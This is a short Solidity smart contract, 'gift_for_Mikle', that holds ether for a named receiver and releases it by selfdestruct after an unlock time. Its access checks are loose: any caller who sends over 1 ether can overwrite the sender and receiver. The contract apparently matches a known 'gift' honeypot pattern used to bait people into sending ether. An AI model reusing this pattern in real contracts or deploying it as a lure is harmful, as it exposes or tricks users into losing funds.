1 pragma solidity ^0.4.20;
2 
3 contract gift_for_Mikle
4 {
5     address sender;
6     
7     address reciver;
8     
9     bool closed = false;
10     
11     uint unlockTime;
12  
13     function SetGiftFor(address _reciver)
14     public
15     payable
16     {
17         if( (!closed&&(msg.value > 1 ether)) || sender==0x00 )
18         {
19             sender = msg.sender;
20             reciver = _reciver;
21             unlockTime = now;
22         }
23     }
24     
25     function SetGiftTime(uint _unixTime)
26     public
27     {
28         if(msg.sender==sender&&now>unlockTime)
29         {
30             unlockTime = _unixTime;
31         }
32     }
33     
34     function GetGift()
35     public
36     payable
37     {
38         if(reciver==msg.sender&&now>unlockTime)
39         {
40             selfdestruct(msg.sender);
41         }
42     }
43     
44     function CloseGift()
45     public
46     {
47         if(sender == msg.sender && reciver != 0x0 )
48         {
49            closed=true;
50         }
51     }
52     
53     function() public payable{}
54 }